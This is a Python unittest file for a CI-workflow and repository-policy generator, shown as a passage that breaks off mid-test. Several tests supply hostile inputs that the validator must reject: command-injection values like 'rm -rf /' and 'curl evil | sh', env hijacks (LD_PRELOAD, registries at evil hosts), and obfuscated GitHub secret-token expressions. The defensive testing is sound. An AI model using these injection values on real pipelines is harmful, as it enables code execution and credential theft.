import copy
import importlib.util
import json
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import unittest
from unittest import mock


HERE = Path(__file__).resolve().parents[1]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


generator = load("public_generator", HERE / "generate.py")
checker = load("repository_checker", HERE / "templates/check_repository.py")


UV_INSTALL = ("printf 'uv==0.11.33 --hash=sha256:9542178978b0b6f16a7ae99e55aca039f493a1edb373a15d7993eab80a28615a\\n'"
              " | python -m pip install --quiet --only-binary :all: --require-hashes --no-deps -r /dev/stdin")
# Generated-setup request for the contracts scaffold: PenniLogic/contracts#2 comment 5905425858.
CONTRACTS_COMMANDS = [
    "python scripts/check_repository.py", "npm ci --no-audit --no-fund", "python scripts/toolchain.py install",
    "python scripts/lint_spec.py", "python scripts/check_breaking_changes.py",
    "python scripts/generate_clients.py --verify", "python scripts/smoke.py python",
    "python scripts/smoke.py typescript", "python scripts/smoke.py kotlin",
    'python -m unittest discover -s scripts/tests -p "test_*.py"',
]
CONTRACTS_STATE = ("Repository foundation plus the OpenAPI lint, deterministic client-generation, breaking-change "
                   "and tag-publication scaffold from PenniLogic/contracts#2; no product endpoints, registry "
                   "publication credentials or published version tags are implemented.")
ANDROID_COMMANDS = [
    "python scripts/check_repository.py",
    "python scripts/quality_gates.py ci",
    "python scripts/quality_gates.py self-test",
    'python -m unittest discover -s scripts/tests -p "test_*.py"',
]


class BaselineTests(unittest.TestCase):
    def test_all_repositories_have_public_hosted_readonly_ci(self):
        for repo in generator.PROFILES["repositories"]:
            with self.subTest(repo=repo):
                output = generator.artifacts(repo)
                for name in (".github/workflows/ci.yml", ".github/workflows/copilot-setup-steps.yml"):
                    checker.validate_workflow(name, output[name].encode())
                ci = json.loads(output[".github/workflows/ci.yml"])
                self.assertEqual("ubuntu-24.04", ci["jobs"]["ci"]["runs-on"])
                self.assertIn("pull_request", ci["on"])
                self.assertNotIn("pull_request_target", ci["on"])

    def test_single_user_policy_does_not_require_self_approval(self):
        for repo in generator.PROFILES["repositories"]:
            policy = json.loads(generator.artifacts(repo)[".github/agent-policy.json"])
            self.assertEqual(0, policy["github_approving_review_count"])
            self.assertTrue(policy["no_bypass"])
            self.assertEqual(["core"], policy["review_floor"])
            self.assertEqual(["qa"], policy["behavior_changes_add"])

    def test_api_build_is_real_and_no_profile_gets_an_invented_step(self):
        api = json.loads(generator.workflow("api"))["jobs"]["ci"]["steps"]
        self.assertIn("python scripts/quality.py build", api[-2]["run"])
        self.assertIn("coverage --base", api[-1]["run"])
        contracts = json.loads(generator.workflow("contracts"))["jobs"]["ci"]["steps"]
        self.assertEqual(["Checkout", "Python", "Node", "JDK", "Run checks"], [step["name"] for step in contracts])
        self.assertEqual("\n".join(CONTRACTS_COMMANDS), contracts[-1]["run"])
        # Only api's explicit-base coverage follows the requested commands; the generator never
        # appends a build, test or publication step that a profile did not ask for.
        for repo in generator.PROFILES["repositories"]:
            if repo != "api":
                self.assertEqual("Run checks", json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"][-1]["name"])

    def test_profiles_run_exactly_their_requested_commands(self):
        expected = {
            ".github": ["python scripts/check_agent_profiles.py", "python -m unittest discover -s scripts/tests"],
            "docs": ["python scripts/check_docs.py", "python scripts/check_test_strategy.py",
                     "python -m unittest discover -s scripts/tests"],
            "contracts": CONTRACTS_COMMANDS[1:],
            "api": [
                "python scripts/materialize_money_sources.py",
                'python scripts/money_provider.py --source-root '
                '"build/source-materialization/contracts-ea56c63d5c9b679537bd9205b04626049c20c572" --strategy-file '
                '"build/source-materialization/docs-a700e639585c61a4610e7b99dbd02b2dab28bdcc/governance/test-strategy.json"',
                "python scripts/money_provider.py --verify",
                "python scripts/materialize_money_sources.py --verify",
                "python scripts/quality.py build", "python -m unittest discover -s scripts/tests",
            ],
            "web": ["npm ci", "npm run lint", "npm run format:check", "npm run typecheck", "npm test",
                    "npm run build", "npm run check:bundle", "npm run report:build",
                    "npm run check:bundle:planted"],
            "admin": ["npm ci --no-audit --no-fund", "npm run lint", "npm run typecheck",
                      "npm run check:imports", "npm test", "npm run build", "npm run smoke"],
            "ai-service": [UV_INSTALL, "uv sync --locked",
                           "uv run --locked ruff check .", "uv run --locked ruff format --check .",
                           "uv run --locked mypy", "uv run --locked pytest"],
            "android": ANDROID_COMMANDS[1:],
            "infra": ["python governance/generate.py --repository infra --check",
                      "python -m unittest discover -s governance/tests",
                      "docker compose -f docker-compose.yml config --quiet",
                      "python -m unittest discover -s scripts/tests"],
        }
        self.assertEqual(set(expected), set(generator.PROFILES["repositories"]))
        for repo, commands in expected.items():
            with self.subTest(repo=repo):
                commands = ["python scripts/check_repository.py", *commands]
                output = generator.artifacts(repo)
                steps = json.loads(output[".github/workflows/ci.yml"])["jobs"]["ci"]["steps"]
                run = [step for step in steps if step["name"] == "Run checks"]
                self.assertEqual([commands], [step["run"].split("\n") for step in run])
                self.assertEqual(commands, json.loads(output[".github/agent-policy.json"])["commands"])
                block = "```text\npython scripts/setup.py\n" + "\n".join(commands) + "\n```"
                for name in ("AGENTS.md", "README.md", "CONTRIBUTING.md"):
                    self.assertIn(block, output[name])
                setup = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                verify = [step for step in setup if step["name"] == "Verify repository"]
                self.assertEqual(["python scripts/check_repository.py"], [step["run"] for step in verify])
                self.assertEqual("python scripts/setup.py", setup[-1]["run"])
        # The pinned uv install is hash-checked, binary-only and dependency-free.
        install = generator.PROFILES["repositories"]["ai-service"]["install"]
        self.assertEqual([UV_INSTALL, "uv sync --locked"], install)
        for flag in ("uv==0.11.33", "--hash=sha256:", "--only-binary :all:", "--require-hashes", "--no-deps"):
            self.assertIn(flag, UV_INSTALL)
        self.assertNotIn('"uv>=', json.dumps(generator.PROFILES["repositories"]["ai-service"]))

    def test_android_grouped_ci_changes_only_five_command_derived_artifacts(self):
        current = {repo: generator.artifacts(repo) for repo in generator.PROFILES["repositories"]}
        previous_profiles = copy.deepcopy(generator.PROFILES)
        previous_profiles["repositories"]["android"]["commands"] = [
            ANDROID_COMMANDS[0],
            *(f"python scripts/quality_gates.py {gate}" for gate in ("build", "test", "lint", "coverage")),
            *ANDROID_COMMANDS[2:],
        ]
        with mock.patch.object(generator, "PROFILES", previous_profiles):
            previous = {repo: generator.artifacts(repo) for repo in generator.PROFILES["repositories"]}
        android_changes = {
            "AGENTS.md", ".github/agent-policy.json", ".github/workflows/ci.yml",
            "CONTRIBUTING.md", "README.md",
        }
        for repo in current:
            with self.subTest(repo=repo):
                self.assertEqual(previous[repo].keys(), current[repo].keys())
                changed = {name for name in current[repo]
                           if current[repo][name].encode("utf-8") != previous[repo][name].encode("utf-8")}
                self.assertEqual(android_changes if repo == "android" else set(), changed)
        workflow = json.loads(previous["android"][".github/workflows/ci.yml"])
        run_checks = next(step for step in workflow["jobs"]["ci"]["steps"] if step["name"] == "Run checks")
        run_checks["run"] = "\n".join(ANDROID_COMMANDS)
        self.assertEqual(workflow, json.loads(current["android"][".github/workflows/ci.yml"]))

    def test_android_grouped_ci_cli_refuses_only_the_removed_or_stubbed_ci_line(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            command = [sys.executable, str(HERE / "generate.py"), "--repository", "android", "--root", str(root)]

            def invoke(*extra):
                return subprocess.run([*command, *extra], capture_output=True, text=True,
                                      encoding="utf-8", timeout=60, check=False)

            generated = invoke()
            self.assertEqual(0, generated.returncode, generated.stderr)
            clean = invoke("--check")
            self.assertEqual(0, clean.returncode, clean.stderr)
            self.assertIn("Public repository baseline verified.", clean.stdout)
            path = root / ".github" / "workflows" / "ci.yml"
            original = path.read_bytes()
            document = json.loads(original)
            run_checks = next(step for step in document["jobs"]["ci"]["steps"] if step["name"] == "Run checks")
            self.assertEqual(ANDROID_COMMANDS, run_checks["run"].split("\n"))
            for replacement in (None, "echo tests skipped"):
                with self.subTest(replacement=replacement):
                    changed = copy.deepcopy(document)
                    run_checks = next(step for step in changed["jobs"]["ci"]["steps"] if step["name"] == "Run checks")
                    commands = list(ANDROID_COMMANDS)
                    if replacement is None:
                        commands.remove(ANDROID_COMMANDS[1])
                    else:
                        commands[1] = replacement
                    self.assertEqual(ANDROID_COMMANDS[2:], commands[-2:])
                    run_checks["run"] = "\n".join(commands)
                    path.write_bytes(generator.encoded(changed).encode("utf-8"))
                    refused = invoke("--check")
                    self.assertEqual(1, refused.returncode, refused.stdout)
                    self.assertEqual("Generated setup differs: .github/workflows/ci.yml\n", refused.stderr)
                    path.write_bytes(original)
                    restored = invoke("--check")
                    self.assertEqual(0, restored.returncode, restored.stderr)

    def test_every_readme_links_the_published_test_strategy(self):
        pointer = ("[PenniLogic/docs](https://github.com/PenniLogic/docs). Verification requirements:\n"
                   "[PenniLogic/docs/governance/test-strategy.md]"
                   "(https://github.com/PenniLogic/docs/blob/main/governance/test-strategy.md)\n"
                   "(numbers in [governance/test-strategy.json]"
                   "(https://github.com/PenniLogic/docs/blob/main/governance/test-strategy.json)).\n")
        for repo in generator.PROFILES["repositories"]:
            with self.subTest(repo=repo):
                output = generator.artifacts(repo)
                self.assertEqual(1, output["README.md"].count(pointer))
                self.assertEqual(1, output["README.md"].count(generator.TEST_STRATEGY + ".md)"))
                for name in output:
                    if name != "README.md":
                        self.assertNotIn(generator.TEST_STRATEGY, output[name], name)

    def test_jdk_resolves_from_the_runner_tool_cache(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            for setup in (False, True):
                with self.subTest(repo=repo, setup=setup):
                    job = json.loads(generator.workflow(repo, setup=setup))["jobs"]
                    steps = job["copilot-setup-steps" if setup else "ci"]["steps"]
                    jdk = [step for step in steps if step.get("uses", "").startswith("actions/setup-java@")]
                    if "java" in profile:
                        self.assertEqual([{"distribution": "temurin", "java-version": profile["java"]}],
                                         [step["with"] for step in jdk])
                        for key in ("check-latest", "cache", "cache-jdk", "force-download", "token"):
                            self.assertNotIn(key, jdk[0]["with"])
                    else:
                        self.assertEqual([], jdk)
        self.assertEqual({"api", "android", "contracts"}, {
            repo for repo, profile in generator.PROFILES["repositories"].items() if "java" in profile
        })

    def test_node_toolchain_only_where_declared(self):
        pin = generator.PROFILES["actions"]["setup-node"]
        for repo, profile in generator.PROFILES["repositories"].items():
            for setup in (False, True):
                with self.subTest(repo=repo, setup=setup):
                    job = json.loads(generator.workflow(repo, setup=setup))["jobs"]
                    steps = job["copilot-setup-steps" if setup else "ci"]["steps"]
                    node = [step for step in steps if step.get("uses", "").startswith("actions/setup-node@")]
                    if "node" in profile:
                        self.assertEqual([{"name": "Node", "uses": f"actions/setup-node@{pin}",
                                           "with": {"node-version-file": ".nvmrc"}}], node)
                        self.assertNotIn("cache", node[0]["with"])
                        self.assertEqual("Python", steps[steps.index(node[0]) - 1]["name"])
                    else:
                        self.assertEqual([], node)
        self.assertEqual({"web", "admin", "contracts", "infra"}, {
            repo for repo, profile in generator.PROFILES["repositories"].items() if "node" in profile
        })

    def test_job_env_timeout_and_install_render_from_profile(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                for setup, job_name in ((False, "ci"), (True, "copilot-setup-steps")):
                    job = json.loads(generator.workflow(repo, setup=setup))["jobs"][job_name]
                    self.assertEqual(profile.get("timeout_minutes", 10), job["timeout-minutes"])
                    if "env" in profile:
                        self.assertEqual(profile["env"], job["env"])
                    else:
                        self.assertNotIn("env", job)
                setup_steps = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                install = [step for step in setup_steps if step["name"] == "Install dependencies"]
                if "install" in profile:
                    self.assertEqual("\n".join(profile["install"]), install[0]["run"])
                    self.assertEqual("Verify repository", setup_steps[setup_steps.index(install[0]) - 1]["name"])
                else:
                    self.assertEqual([], install)
                ci_steps = json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"]
                self.assertEqual([], [step for step in ci_steps if step["name"] == "Install dependencies"])
        self.assertEqual({"NEXT_TELEMETRY_DISABLED": "1"}, generator.PROFILES["repositories"]["web"]["env"])
        self.assertEqual(30, generator.PROFILES["repositories"]["api"]["timeout_minutes"])
        self.assertEqual(30, generator.PROFILES["repositories"]["android"]["timeout_minutes"])
        self.assertEqual(30, generator.PROFILES["repositories"]["contracts"]["timeout_minutes"])

    def test_ignore_attributes_and_guide_render_from_profile(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                output = generator.artifacts(repo)
                ignore = output[".gitignore"].split("\n")[:-1]
                self.assertEqual(generator.IGNORE + profile.get("ignore", []), ignore)
                self.assertIn("!.env.example", ignore)
                attributes = output[".gitattributes"].split("\n")[:-1]
                self.assertEqual(["* text=auto eol=lf", "*.jar binary", *profile.get("attributes", [])], attributes)
                guide = profile.get("developer_guide")
                for name in ("README.md", "AGENTS.md", "CONTRIBUTING.md"):
                    if guide:
                        self.assertIn(f"[{guide}]({guide})", output[name])
                        self.assertIn("not generated", output[name])
                    else:
                        self.assertNotIn("that guide is not generated", output[name])
        web = generator.artifacts("web")
        self.assertIn("Install Python 3.14, Git, and Node 24.14.0 (see `.nvmrc`), then run:", web["CONTRIBUTING.md"])
        self.assertIn("Install Python 3.14, Git, and JDK 21, then run:", generator.artifacts("api")["CONTRIBUTING.md"])
        self.assertIn("Install Python 3.14, Git, and Node 24.14.0 (see `.nvmrc`), then run:",
                      generator.artifacts("infra")["CONTRIBUTING.md"])
        contracts = generator.artifacts("contracts")
        self.assertIn("Install Python 3.14, Git, Node 24.14.0 (see `.nvmrc`), and JDK 21, then run:",
                      contracts["CONTRIBUTING.md"])
        self.assertTrue(web[".gitignore"].endswith("next-env.d.ts\n*.tsbuildinfo\n"))
        self.assertTrue(contracts[".gitignore"].endswith(".DS_Store\n.toolchain/\n.kotlin/\n.mypy_cache/\n*.tsbuildinfo\n"))
        self.assertTrue(generator.artifacts("android")[".gitattributes"].endswith("gradlew.bat text eol=crlf\n"))
        self.assertTrue(contracts[".gitattributes"].endswith("*.jar binary\nsmoke/kotlin/gradlew.bat text eol=crlf\n"))

    def test_android_sdk_and_wrapper_steps_only_for_android(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                ci = json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"]
                setup = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                names = [step["name"] for step in ci]
                if repo == "android":
                    self.assertEqual(["Checkout", "Python", "JDK", "Android SDK packages",
                                      "Verify Gradle wrapper", "Run checks"], names)
                    self.assertEqual(["Checkout", "Python", "JDK", "Android SDK packages",
                                      "Verify repository", "Install managed hook"],
                                     [step["name"] for step in setup])
                    self.assertEqual({"distribution": "temurin", "java-version": "21"}, ci[2]["with"])
                    sdk = ci[3]["run"]
                    self.assertIn('for package in "platforms;android-36" "build-tools;36.0.0" "platform-tools"; do', sdk)
                    self.assertIn('yes | "$manager" --licenses > /dev/null || true', sdk)
                    self.assertIn('"$manager" --install $missing', sdk)
                    self.assertLess(sdk.index("--licenses"), sdk.index("--install"))
                    self.assertNotIn("uses", ci[3])
                    self.assertNotIn("uses", ci[4])
                    self.assertEqual(
                        'echo "7a9ce74cff467ca1bf60a4fcd9f05185acceda4d0f382434d393e17864262c5d'
                        '  gradle/wrapper/gradle-wrapper.jar" | sha256sum -c -', ci[4]["run"])
                else:
                    self.assertNotIn("android_sdk", profile)
                    self.assertNotIn("gradle_wrapper_jar_sha256", profile)
                    for step in ci + setup:
                        self.assertNotIn(step["name"], {"Android SDK packages", "Verify Gradle wrapper"})
                        self.assertNotIn("sdkmanager", json.dumps(step))
                for step in ci + setup:
                    if "uses" in step:
                        self.assertRegex(step["uses"], r"^actions/(checkout|setup-python|setup-node|setup-java)@")

    def test_profile_values_that_could_change_generated_meaning_are_rejected(self):
        base = {
            "purpose": "Example repository", "state": "Example state; nothing is implemented.",
            "commands": ["python scripts/check_repository.py"],
        }
        expression = "echo ${{ github.event.pull_request.title }}"
        bad = [
            {"node": "24"}, {"node": "24.14.0\nrm -rf /"}, {"java": "21 && curl evil"},
            {"timeout_minutes": "30"}, {"timeout_minutes": 0}, {"timeout_minutes": 361}, {"timeout_minutes": True},
            {"env": ["A=1"]}, {"env": {"lower": "1"}}, {"env": {"GITHUB_TOKEN": "x"}},
            {"env": {"RUNNER_TEMP": "/tmp"}}, {"env": {"ACTIONS_STEP_DEBUG": "true"}},
            {"env": {"PATH": "/evil:/usr/bin"}}, {"env": {"LD_PRELOAD": "/tmp/x.so"}},
            {"env": {"NODE_OPTIONS": "--require /tmp/x.js"}}, {"env": {"PIP_INDEX_URL": "https://evil"}},
            {"env": {"NPM_CONFIG_REGISTRY": "https://evil"}}, {"env": {"UV_INDEX_URL": "https://evil"}},
            {"env": {"INPUT_TOKEN": "x"}}, {"env": {"JAVA_TOOL_OPTIONS": "-javaagent:x"}},
            {"env": {"GRADLE_OPTS": "-Dx"}}, {"env": {"NEXT_TELEMETRY_DISABLED": "1", "CI": "1"}},
            {"env": {"NEXT_TELEMETRY_DISABLED": "${{ secrets.TOKEN }}"}},
            {"env": {"NEXT_TELEMETRY_DISABLED": "a\nb"}}, {"env": {"NEXT_TELEMETRY_DISABLED": 1}},
            {"ignore": ["!.env"]}, {"ignore": ["a\nb"]}, {"ignore": [" leading"]}, {"ignore": ["trailing "]},
            {"ignore": "next-env.d.ts"}, {"ignore": []}, {"ignore": [expression]},
            {"attributes": ["* text\n* -text"]}, {"attributes": ["* -text"]}, {"attributes": ["*.jar text"]},
            {"attributes": ["*"]}, {"attributes": ["gradlew.bat"]}, {"attributes": []}, {"attributes": [expression]},
            {"attributes": ["[attr]binary text"]}, {"attributes": ["[attr]lf text eol=lf"]},
            {"install": ["npm ci\ncurl evil | sh"]}, {"install": []}, {"install": [expression]},
            {"install": ['npm ci --tag "${{ github.head_ref }}"']},
            {"commands": []}, {"commands": ["npm ci"]},
            {"commands": ["python scripts/check_repository.py", "bad\nline"]},
            {"commands": ["python scripts/check_repository.py", expression]},
            {"commands": ["python scripts/check_repository.py", "echo ${{secrets.X}}"]},
            {"developer_guide": "docs/development.txt"}, {"developer_guide": "../other/README.md"},
            {"developer_guide": "/etc/passwd.md"},
            {"gradle_wrapper_jar_sha256": "7a9ce74c"}, {"gradle_wrapper_jar_sha256": "G" * 64},
            {"android_sdk": ["platforms;android-36; rm -rf /"]}, {"android_sdk": ['"platform-tools"']},
            {"android_sdk": ["$HOME"]}, {"android_sdk": ["platform tools"]}, {"android_sdk": []},
            {"purpose": "Line one\nLine two"}, {"purpose": ""}, {"purpose": None}, {"purpose": 3},
            {"state": "Read ${{ github.event.issue.body }}"}, {"state": "Trailing "}, {"state": "Caf\u00e9 state"},
        ]
        for overrides in bad:
            with self.subTest(overrides=overrides):
                with self.assertRaises(ValueError):
                    generator.validate_profile("example", {**base, **overrides})
        for missing in ("purpose", "state", "commands"):
            with self.subTest(missing=missing), self.assertRaises(ValueError):
                generator.validate_profile("example", {key: value for key, value in base.items() if key != missing})
        generator.validate_profile("example", {
            **base, "node": "24.14.0", "java": "21", "timeout_minutes": 30,
            "env": {"NEXT_TELEMETRY_DISABLED": "1"}, "ignore": ["next-env.d.ts"], "attributes": ["gradlew.bat text eol=crlf"],
            "install": [UV_INSTALL, "npm ci"], "developer_guide": "docs/development.md",
            "gradle_wrapper_jar_sha256": "0" * 64, "android_sdk": ["platforms;android-36", "platform-tools"],
            "commands": ["python scripts/check_repository.py", UV_INSTALL, 'echo "$HOME" | sha256sum -c -',
                         "python -m unittest discover -s scripts/tests -p \"test_*.py\""],
        })
        for repo, profile in generator.PROFILES["repositories"].items():
            generator.validate_profile(repo, profile)

    def test_attribute_lines_are_a_narrow_allowlist(self):
        base = {"purpose": "Example repository", "state": "Example state; nothing is implemented.",
                "commands": ["python scripts/check_repository.py"]}
        # Every line below was confirmed by the PR #40 reviewers (git check-attr) to override the
        # shared `* text=auto eol=lf` / `*.jar binary` rules or to attach an unreviewed attribute.
        evasions = [
            "** -text", "**/* -text", "/* -text", "\\* -text", "**/*.jar text", "*.[jJ]ar text",
            "*.ja[r] text", "*.j?r text", "*.JAR text", "*.Jar binary", "* text=auto eol=lf", "*.jar binary",
            "gradle/wrapper/gradle-wrapper.jar text", "gradle/wrapper/gradle-wrapper.jar text eol=lf",
            "gradle/wrapper/gradle-wrapper.jar -text", "GRADLE/WRAPPER/GRADLE-WRAPPER.JAR eol=crlf",
            "lib/x.jar text", "*.kt linguist-generated=true", "*.kt linguist-generated", "*.kt filter=lfs",
            "*.kt merge=ours", "*.kt export-subst", "*.kt export-ignore", "*.kt diff=kotlin", "*.kt -diff",
            "*.kt text=auto", "*.kt eol=native", "*.kt !text", "*.kt Text", "*.kt TEXT", "*.kt binary text",
            "*.kt binary -text", "*.kt binary eol=lf", "*.kt text -text", "*.kt eol=lf eol=crlf",
            "*.kt text text", "*.kt", "gradlew.bat", "*", "[attr]binary text", "[attr]lf text eol=lf",
            "*.tar.gz binary", "*.min.js -text", "*.* -text", "*.k? text", "*.kt* text", "docs/*.md text",
            "/gradlew.bat text eol=crlf", ".editorconfig text", "-x text", "#x text", '"a b" text', "!x text",
            "x;y text", "x y text eol=lf", "x=y text", "x$HOME text", "x{a,b} text",
        ]
        for line in evasions:
            with self.subTest(line=line), self.assertRaises(ValueError):
                generator.validate_profile("example", {**base, "attributes": [line]})
        accepted = ["gradlew.bat text eol=crlf", "*.png binary", "*.PNG binary", "*.txt -text",
                    "docs/notes.md text eol=lf", "lib/x.jar binary", "*.sh text", "x.y-z_1/w text eol=lf"]
        generator.validate_profile("example", {**base, "attributes": accepted})
        for line in accepted:
            with self.subTest(line=line):
                generator.validate_profile("example", {**base, "attributes": [line]})
        self.assertEqual({"text", "-text", "binary", "eol=lf", "eol=crlf"}, generator.ATTRIBUTE_TOKENS)
        self.assertEqual(["* text=auto eol=lf", "*.jar binary"], generator.ATTRIBUTES)

    def test_generated_attributes_keep_shared_rules_effective(self):
        # git itself resolves the generated file: the profile line applies only to its literal path
        # and the shared text/binary rules stay in force for everything else, ignorecase or not.
        paths = ["lib/x.jar", "a/b.txt", "gradlew.bat", "sub/gradlew.bat", "GRADLEW.BAT", "Main.kt"]
        for repo, ignorecase in (("android", "true"), ("android", "false"), ("web", "true")):
            with self.subTest(repo=repo, ignorecase=ignorecase), tempfile.TemporaryDirectory() as tmp:
                subprocess.run(["git", "init", "-q", tmp], check=True)
                (Path(tmp) / ".gitattributes").write_text(generator.artifacts(repo)[".gitattributes"], encoding="utf-8")
                result = subprocess.run(
                    ["git", "-C", tmp, "-c", f"core.ignorecase={ignorecase}", "check-attr", "text", "eol", "binary",
                     "--", *paths], capture_output=True, text=True, encoding="utf-8", check=True)
                attributes = {}
                for line in result.stdout.splitlines():
                    path, attribute, value = line.rsplit(": ", 2)
                    attributes[path, attribute] = value
                names = ("text", "eol", "binary")
                self.assertEqual(("unset", "lf", "set"), tuple(attributes["lib/x.jar", name] for name in names))
                for path in ("a/b.txt", "Main.kt"):
                    self.assertEqual(("auto", "lf", "unspecified"), tuple(attributes[path, name] for name in names))
                crlf = repo == "android"
                for path in ("gradlew.bat", "sub/gradlew.bat"):
                    self.assertEqual(("set", "crlf") if crlf else ("auto", "lf"),
                                     (attributes[path, "text"], attributes[path, "eol"]))
                self.assertEqual(("set", "crlf") if crlf and ignorecase == "true" else ("auto", "lf"),
                                 (attributes["GRADLEW.BAT", "text"], attributes["GRADLEW.BAT", "eol"]))

    def test_contracts_attribute_line_applies_only_to_its_literal_path(self):
        # A pattern containing a slash is anchored to the repository root, so the requested
        # `smoke/kotlin/gradlew.bat text eol=crlf` cannot reach a root or nested gradlew.bat, and the
        # shared jar rule still covers the smoke consumer's wrapper jar.
        paths = ["smoke/kotlin/gradlew.bat", "gradlew.bat", "other/smoke/kotlin/gradlew.bat",
                 "smoke/kotlin/gradlew", "smoke/kotlin/gradle/wrapper/gradle-wrapper.jar", "spec/openapi.yaml"]
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "init", "-q", tmp], check=True)
            (Path(tmp) / ".gitattributes").write_text(generator.artifacts("contracts")[".gitattributes"], encoding="utf-8")
            result = subprocess.run(
                ["git", "-C", tmp, "check-attr", "text", "eol", "binary", "--", *paths],
                capture_output=True, text=True, encoding="utf-8", check=True)
            attributes = {}
            for line in result.stdout.splitlines():
                path, attribute, value = line.rsplit(": ", 2)
                attributes[path, attribute] = value
        names = ("text", "eol", "binary")
        self.assertEqual(("set", "crlf", "unspecified"), tuple(attributes["smoke/kotlin/gradlew.bat", n] for n in names))
        for path in ("gradlew.bat", "other/smoke/kotlin/gradlew.bat", "smoke/kotlin/gradlew", "spec/openapi.yaml"):
            self.assertEqual(("auto", "lf", "unspecified"), tuple(attributes[path, n] for n in names), path)
        self.assertEqual(("unset", "lf", "set"),
                         tuple(attributes["smoke/kotlin/gradle/wrapper/gradle-wrapper.jar", n] for n in names))

    def test_expression_opener_never_reaches_a_generated_workflow(self):
        for repo in generator.PROFILES["repositories"]:
            for setup in (False, True):
                workflow = json.loads(generator.workflow(repo, setup=setup))
                job = workflow["jobs"]["copilot-setup-steps" if setup else "ci"]
                for step in job["steps"]:
                    if "run" in step:
                        self.assertNotIn("${{", step["run"], msg=f"{repo} {step['name']}")
                if repo == "api" and not setup:
                    self.assertEqual(["Coverage against explicit base"],
                                     [step["name"] for step in job["steps"] if "${{" in json.dumps(step)])
                self.assertNotIn("${{", json.dumps(job.get("env", {})))

    def test_generated_output_passes_the_generated_repository_check(self):
        for repo in generator.PROFILES["repositories"]:
            with self.subTest(repo=repo), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                generator.generate(repo, root)
                files = {
                    path.relative_to(root).as_posix(): path.read_bytes()
                    for path in root.rglob("*") if path.is_file()
                }
                files["migration-source.json"] = b"{}\n"
                if generator.profile_for(repo).get("pr_workflow_integrity", False):
                    self.assertEqual([
                        "Invalid or unsafe workflow: .github/workflows/pr-workflow-integrity.yml: "
                        "unreviewed workflow expression; public jobs must not receive secrets",
                    ], checker.check(files))
                else:
                    self.assertEqual([], checker.check(files))
                generated_checker = load(f"generated_checker_{repo.strip('.')}", root / "scripts/check_repository.py")
                self.assertEqual([], generated_checker.check(files))

    def test_generator_drift_and_determinism(self):
        for repo in ("web", "android", "contracts"):
            with self.subTest(repo=repo), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                generator.generate(repo, root)
                first = {path: path.read_bytes() for path in root.rglob("*") if path.is_file()}
                generator.generate(repo, root)
                self.assertEqual(first, {path: path.read_bytes() for path in root.rglob("*") if path.is_file()})
                generator.generate(repo, root, check=True)
                (root / "AGENTS.md").write_text("changed", encoding="utf-8")
                with self.assertRaisesRegex(ValueError, "Generated setup differs"):
                    generator.generate(repo, root, check=True)

    def test_secret_is_detected_without_echoing_value(self):
        value = ("gh" + "p_" + "a" * 36).encode()
        errors = checker.check({"example.txt": value})
        self.assertTrue(any("Possible credential" in item for item in errors))
        self.assertNotIn(value.decode(), "\n".join(errors))

    def test_duplicate_json_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "Duplicate JSON"):
            checker.json_document(b'{"key": 1, "key": 2}')

    def test_unpinned_action_is_rejected(self):
        workflow = json.loads(generator.workflow("web"))
        workflow["jobs"]["ci"]["steps"][0]["uses"] = "actions/checkout@main"
        with self.assertRaisesRegex(ValueError, "immutable"):
            checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_privileged_trigger_is_rejected(self):
        workflow = json.loads(generator.workflow("web"))
        workflow["on"]["pull_request_target"] = {}
        with self.assertRaisesRegex(ValueError, "trigger"):
            checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_writable_token_and_self_hosted_are_rejected(self):
        for mutation in ("token", "runner"):
            workflow = json.loads(generator.workflow("web"))
            if mutation == "token":
                workflow["permissions"] = {"contents": "write"}
            else:
                workflow["jobs"]["ci"]["runs-on"] = ["self-hosted"]
            with self.assertRaises(ValueError):
                checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_secret_in_job_or_workflow_env_is_rejected(self):
        forms = ("${{ secrets.NPM_TOKEN }}", "${{ secrets['NPM_TOKEN'] }}", '${{ secrets["NPM_TOKEN"] }}',
                 "${{ toJSON(secrets) }}", "${{ github.token }}", "${{ github['token'] }}", '${{ github["token"] }}',
                 "${{ SECRETS.NPM_TOKEN }}", "${{ GitHub.Token }}", "${{ toJSON(github) }}", "${{ toJson(github) }}",
                 "${{ github[format('to{0}', 'ken')] }}", "${{ github[join(fromJSON('[\"to\",\"ken\"]'), '')] }}",
                 "${{ fromJSON(toJSON(github)).token }}", "${{ format('{0}', github.token) }}",
                 "${{ github.workflow }}${{ github.token }}", "${{github.token}}", "${{ github . token }}")
        levels = ("workflow-name", "workflow-env", "workflow-env-key", "concurrency", "job-name", "job-env",
                  "job-if", "container", "step-name", "step-if", "step-env", "step-with", "step-run")
        for level in levels:
            for form in forms:
                with self.subTest(level=level, form=form):
                    workflow = json.loads(generator.workflow("web"))
                    job = workflow["jobs"]["ci"]
                    if level == "workflow-name":
                        workflow["name"] = f"CI {form}"
                    elif level == "workflow-env":
                        workflow["env"] = {"NPM_TOKEN": form}
                    elif level == "workflow-env-key":
                        workflow["env"] = {form: "1"}
                    elif level == "concurrency":
                        workflow["concurrency"]["group"] = form
                    elif level == "job-name":
                        job["name"] = f"CI {form}"
                    elif level == "job-env":
                        job["env"] = {"NPM_TOKEN": form}
                    elif level == "job-if":
                        job["if"] = form
                    elif level == "container":
